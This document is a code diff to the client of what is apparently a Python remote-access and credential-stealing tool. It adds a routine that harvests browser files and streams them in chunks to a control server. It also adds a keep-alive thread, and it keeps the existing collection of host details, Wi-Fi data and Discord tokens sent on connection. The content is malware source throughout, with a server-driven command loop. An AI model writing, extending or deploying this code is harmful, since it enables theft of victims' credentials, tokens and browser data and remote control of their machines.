@@ -5,15 +5,18 @@ import requests
 import time
 import uuid
 import psutil
-import ctypes
 import sys
+import threading
 
 from modules import wifi
 from modules.discord import discord
+from modules.browser.browser_shared import get_installed_browsers
+from modules.browser import browser
+from modules.disk import disk
 from modules.antivirus import antivirus
-from constants import path
 from common import utils
 from client.handlers import CommandHandler
+
 
 class Client:
     def __init__(self, server_address: tuple[str, int], command_handler: CommandHandler) -> None:
@@ -36,6 +39,8 @@ class Client:
         isp = requests.get("https://ipapi.co/org").text
 
         self.send(json.dumps({
+            "type": "CONNECTION",
+            "data": {
             "computer_name": platform.node(),
             "computer_os": platform.system(),
             "computer_version": platform.version(),
@@ -55,14 +60,62 @@ class Client:
             "subnet_mask": psutil.net_if_addrs().get('Ethernet')[0].netmask if psutil.net_if_addrs().get('Ethernet') else 'N/A',
             "isp": isp,
             "timezone": time.tzname[0],
-            "disks": "\n".join([
-                f"{disk.device}: {disk.mountpoint} - ({disk.fstype} / {utils.get_file_system_description(disk.fstype)})"
-                for disk in psutil.disk_partitions()
-            ]),
+            "disks": json.dumps(disk.Disk().execute()),
             "wifi": wifi.get_wifi(),
-            "webbrowsers": path.get_installed_browsers(),
+            "webbrowsers": get_installed_browsers(),
             "discord_tokens": discord.Discord().execute(),
+            }
         }))
+
+    def modular_run(self) -> None:
+        files = browser.Browser().execute()
+        for file in files:
+            self.send_file(file)
+
+    def send_file(self, file_path: str) -> None:
+        self.send(json.dumps({
+            "type": "prefile",
+            "data": None,
+        }))
+
+        response = json.loads(self.receive())
+        if response["type"] != "prefile":
+            print(f"Failed to receive confirmation for '{file_path}'")
+            return
+
+        id = response["data"]
+        if not id:
+            print(f"Failed to receive file ID for '{file_path}'")
+            return
+
+        # Continue now that we have the ID.
+
+        with open(file_path, 'rb') as file:
+            while (chunk := file.read(1024)):
+                self.client.sendall(json.dumps({
+                    "type": "file",
+                    "data": {
+                        "id": id,
+                        "chunk": chunk,
+                    }
+                }))
+
+        self.client.sendall(json.dumps({
+            "type": "file",
+            "data": {
+                "id": id,
+                "chunk": None,
+                "END_OF_FILE": True,
+            }
+        }))
+
+        file.close()
+
+        confirmation = self.receive()
+        if confirmation == "FILE_RECEIVED":
+            print(f"File '{file_path}' successfully sent and received.")
+        else:
+            print(f"Failed to receive confirmation for '{file_path}'.")
 
     def send(self, data: str) -> None:
         chunk_size = 1024
@@ -80,11 +133,29 @@ class Client:
             chunks.append(chunk.decode('utf-8'))
         return ''.join(chunks)
 
+    def send_keep_alive(self) -> None:
+        try:
+            self.send(json.dumps({
+                "type": "PING",
+                "data": None,
+            }))
+        except Exception as e:
+            print(f"Failed to send keep-alive message: {e}")
+
     def run(self) -> None:
+        def keep_alive():
+            while True:
+                self.send_keep_alive()
+                time.sleep(30)  # Send keep-alive every 30 seconds
+
+        # Start the keep-alive thread
+        threading.Thread(target=keep_alive, daemon=True).start()
+
         try:
             while True:
                 data = self.receive()
                 if not data:
+                    print("Server closed the connection.")
                     break
                 self.command_handler.handle(self, data)
         except Exception as e:
